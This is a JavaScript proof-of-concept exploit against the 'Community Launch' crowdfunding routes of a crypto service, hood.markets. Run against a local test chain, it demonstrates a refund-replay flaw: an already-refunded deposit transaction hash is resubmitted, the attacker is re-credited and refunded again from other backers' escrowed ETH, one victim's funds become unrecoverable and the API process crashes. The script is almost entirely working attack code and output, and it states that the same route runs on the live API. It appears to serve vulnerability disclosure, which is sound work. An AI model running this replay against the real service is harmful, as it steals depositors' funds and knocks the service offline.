/**
 * PoC — hood.markets "Community Launch": refund replay / double-count.
 *
 * Runs the REAL Express handlers (src/routes/communityLaunch.ts), REAL refund path
 * (lib/petitionRefunds.ts + lib/petitionRobinhoodEscrow.ts), REAL DB SQL
 * (lib/petitionDb.ts statements, ported to node:sqlite) against a local EVM whose
 * chainId is 4663. `DEPLOYER_PRIVATE_KEY` is BOTH the deposit escrow address
 * (lib/petitionConfig.ts) and the wallet that signs refunds (lib/petitionRefunds.ts).
 *
 * Phases:
 *   0  anyone can open a round, choose ticker/name/goal/slots, and name themselves
 *      fee recipient (no auth, no stake)
 *   1  non-atomic slot check: two wallets pass /prepare-deposit, both deposits land
 *      -> raise over-committed past target
 *   2  refund replay: /confirm re-accepts an ALREADY REFUNDED deposit tx hash
 *      (verifyPetitionDeposit never binds the tx hash to an order) and
 *      insertPetitionOrder flips the order back to 'active' -> the attacker is
 *      credited again and can /refund again, every cycle paid out of the shared
 *      escrow, i.e. out of other backers' ETH
 *   3  the last backer can no longer be refunded (escrow is short) -> funds stuck
 */
import express from 'express';
import ganache from 'ganache';
import { ethers } from 'ethers';
import { createPublicClient, createWalletClient, http } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';

const RPC_PORT = 8599;
const API_PORT = 8600;
const RPC = `http://127.0.0.1:${RPC_PORT}`;
const API = `http://127.0.0.1:${API_PORT}`;

const devWallet = ethers.Wallet.createRandom();
const DEV_PK = devWallet.privateKey;
const DEV = devWallet.address;
const A_PK = '0x' + '11'.repeat(32);
const B_PK = '0x' + '22'.repeat(32);
const C_PK = '0x' + '33'.repeat(32);
const A = new ethers.Wallet(A_PK).address;
const B = new ethers.Wallet(B_PK).address;
const C = new ethers.Wallet(C_PK).address;
const E = ethers.parseEther;
const FLOAT = E('0.05'); // operational gas float that also sits in the escrow EOA

const log = (...a) => console.log(...a);
const hdr = (s) => console.log(`\n=== ${s} ===`);
const eth = (w) => (Number(w) / 1e18).toFixed(6);

(async () => {
  // ---------------- local EVM (chain 4663) ----------------
  const srv = ganache.server({
    logging: { quiet: true },
    chain: { chainId: 4663 },
    wallet: {
      accounts: [
        { secretKey: DEV_PK, balance: '0x' + FLOAT.toString(16) },
        { secretKey: A_PK, balance: '0x' + E('10').toString(16) },
        { secretKey: B_PK, balance: '0x' + E('10').toString(16) },
        { secretKey: C_PK, balance: '0x' + E('10').toString(16) },
      ],
    },
  });
  await srv.listen(RPC_PORT, '127.0.0.1');
  const g = srv.provider;
  const rpc = (method, params) => g.request({ method, params });
  const bal = async (a) => BigInt(await rpc('eth_getBalance', [a, 'latest']));

  process.env.DEPLOYER_PRIVATE_KEY = DEV_PK;
  process.env.CHAIN_RPC_URL = RPC;
  process.env.WEB_ONLY_MODE = 'true';
  process.env.PORT = String(API_PORT + 1);

  const db = await import('./src/lib/petitionDb.js');
  db.initPetitionDb();
  const { registerCommunityLaunchRoutes } = await import('./src/routes/communityLaunch.js');
  const app = express();
  app.use(express.json());
  registerCommunityLaunchRoutes(app);
  const api = await new Promise((r) => { const s = app.listen(API_PORT, '127.0.0.1', () => r(s)); });

  const TIMEOUT = 6000;
  let unhandled = null;
  process.on('unhandledRejection', (e) => { unhandled = e; });
  const post = async (path, body) => {
    const ctl = new AbortController();
    const t = setTimeout(() => ctl.abort(), TIMEOUT);
    try {
      const res = await fetch(API + path, {
        method: 'POST', headers: { 'content-type': 'application/json' },
        body: JSON.stringify(body), signal: ctl.signal,
      });
      return { status: res.status, json: await res.json() };
    } catch (e) {
      return { status: 'NO_RESPONSE (' + (e.name === 'AbortError' ? 'handler never replied' : e.message) + ')', json: {} };
    } finally { clearTimeout(t); }
  };

  const wallets = { [A]: new ethers.Wallet(A_PK), [B]: new ethers.Wallet(B_PK), [C]: new ethers.Wallet(C_PK) };
  const nonces = {};
  /** backer -> escrow EOA deposit, exactly what the web UI asks the user to send */
  const depositTx = async (from, value) => {
    const nonce = nonces[from] ?? Number(await rpc('eth_getTransactionCount', [from, 'pending']));
    nonces[from] = nonce + 1;
    const raw = await wallets[from].signTransaction({
      to: DEV, value, gasLimit: 21000n, nonce, maxFeePerGas: 2n * 10n ** 9n,
      maxPriorityFeePerGas: 10n ** 9n, chainId: 4663, type: 2,
    });
    const h = await rpc('eth_sendRawTransaction', [raw]);
    const rc = await rpc('eth_getTransactionReceipt', [h]);
    if (rc.blockNumber) await rpc('evm_mine', {});
    if (!rc || rc.status !== '0x1') throw new Error('deposit tx reverted');
    return h;
  };
  const escrowBackerFunds = async () => (await bal(DEV)) - FLOAT; // ETH that belongs to backers

  log(`escrow EOA (== DEPLOYER_PRIVATE_KEY) : ${DEV}`);
  log(`attacker A / victim B / victim C     : ${A} / ${B.slice(0, 10)}… / ${C.slice(0, 10)}…`);
  log(`operational float already in escrow  : ${eth(FLOAT)} ETH`);

  // ---------------- 0. attacker opens the round ----------------
  hdr('0. anonymous round creation (no auth, no stake, fee recipient = attacker)');
  const created = await post('/api/community-launch/create', {
    tokenName: 'Claude Opus', tokenSymbol: 'ANTHROPIC', starterWallet: A,
    targetRaiseEth: '0.4', supporterSlots: 4,
  });
  log(`POST /create -> ${created.status} ok=${created.json.ok} reused=${created.json.reused ?? false}`);
  const id = Number(created.json.petition.id);
  const p0 = await db.getPetitionById(id);
  log(`round #${id}: target ${eth(p0.target_raise_wei)} ETH / ${p0.supporter_slots} slots (${eth(BigInt(p0.target_raise_wei) / 4n)} ETH each), status ${p0.status}`);
  log(`starter_wallet (= fee recipient of the future token) = ${p0.starter_wallet}`);
  log('ticker ANTHROPIC is now reserved protocol-wide (deployWeb + agent preflight block it)');

  // ---------------- 1. non-atomic slot check ----------------
  hdr('1. non-atomic slot reservation: two wallets clear /prepare-deposit, both deposits land');
  const prepB = await fetch(`${API}/api/community-launch/prepare-deposit?id=${id}&wallet=${B}&contributionEth=0.1`).then((r) => r.json());
  const prepC = await fetch(`${API}/api/community-launch/prepare-deposit?id=${id}&wallet=${C}&contributionEth=0.1`).then((r) => r.json());
  log(`B /prepare-deposit -> ok=${prepB.ok}   C /prepare-deposit -> ok=${prepC.ok}  (both told to send 0.1 ETH)`);
  const txB = await depositTx(B, E('0.1'));
  const txC = await depositTx(C, E('0.1'));
  const confB = await post('/api/community-launch/confirm', { id, wallet: B, contributionEth: '0.1', signature: txB });
  const confC = await post('/api/community-launch/confirm', { id, wallet: C, contributionEth: '0.1', signature: txC });
  log(`B confirm -> ${confB.status} raised=${eth(confB.json.raisedWei)}   C confirm -> ${confC.status} raised=${eth(confC.json.raisedWei)}`);
  log(`escrow backer funds: ${eth(await escrowBackerFunds())} ETH from 2 backers (2 of 4 slots)`);

  // ---------------- 2. refund replay ----------------
  hdr('2. refund replay: /confirm accepts a deposit tx hash that was already refunded');
  const txA = await depositTx(A, E('0.1'));
  const confA = await post('/api/community-launch/confirm', { id, wallet: A, contributionEth: '0.1', signature: txA });
  log(`A deposits 0.1 (tx ${txA.slice(0, 12)}…) -> confirm ${confA.status} raised=${eth(confA.json.raisedWei)}`);
  const aStart = await bal(A);

  let cycles = 0;
  for (let i = 1; i <= 2; i++) {
    // 2 cycles are enough to prove it repeats; the loop is not rate-limited in any way
    const r = await post('/api/community-launch/refund', { id, wallet: A });
    if (r.status !== 200) { log(`  cycle ${i}: refund -> ${r.status} ${JSON.stringify(r.json).slice(0, 120)}`); break; }
    const afterRefund = await bal(A);
    const again = await post('/api/community-launch/confirm', {
      id, wallet: A, contributionEth: '0.1', signature: txA, // <-- SAME, already-settled tx hash
    });
    if (again.status !== 200) { log(`  cycle ${i}: replay rejected ${again.status} ${JSON.stringify(again.json).slice(0, 120)}`); break; }
    cycles++;
    log(`  cycle ${i}: /refund paid 0.1 ETH (A=${eth(afterRefund)}) then /confirm replayed tx ${txA.slice(0, 12)}… -> ${again.status}, raised=${eth(again.json.raisedWei)}, escrow backer funds=${eth(await escrowBackerFunds())}`);
  }
  const aEnd = await bal(A);
  log(`\n  attacker: deposited 0.1 ETH once, refund/replay cycles executed: ${cycles}`);
  log(`  attacker net PnL = +${eth(aEnd - aStart)} ETH (funds taken from B and C)`);
  log(`  escrow backer funds now: ${eth(await escrowBackerFunds())} ETH (was 0.3 after three deposits)`);

  const orders = await db.listPetitionOrders(id);
  hdr('3. victim withdrawal now fails — refund route throws and never answers');
  for (const o of orders) log(`  order ${o.wallet.slice(0, 10)}… status=${o.status} deposit=${eth(o.deposit_wei)} tx=${o.deposit_tx_hash.slice(0, 10)}…`);
  const bs = await bal(B);
  const refundB = await post('/api/community-launch/refund', { id, wallet: B });
  log(`B /refund -> ${refundB.status} (victim B is paid out of what is left)`);
  const cs = await bal(C);
  const refundC = await post('/api/community-launch/refund', { id, wallet: C });
  log(`C /refund -> ${refundC.status} — escrow is short, refundPetitionDeposit throws, Express 4 never answers`);
  log(`  unhandled rejection raised at routes/communityLaunch.ts:457 -> Node 22 default policy kills the API process`);
  log(`  ${String(unhandled?.shortMessage || unhandled?.name || 'none').slice(0, 110)}`);
  log(`C balance ${eth(cs)} -> ${eth(await bal(C))} ETH: victim C's 0.1 ETH is unrecoverable`);
  log(`escrow backer funds: ${eth(await escrowBackerFunds())} ETH but DB still reports raised=${eth(await db.sumActiveRaisedWei(id))} ETH`);
  log('\nNote: the same route runs verbatim on api.hood.markets; only the RPC endpoint and key differ.');

  api.close();
  await srv.close();
  process.exit(0);
})().catch((e) => { console.error('FAIL', e); process.exit(1); });
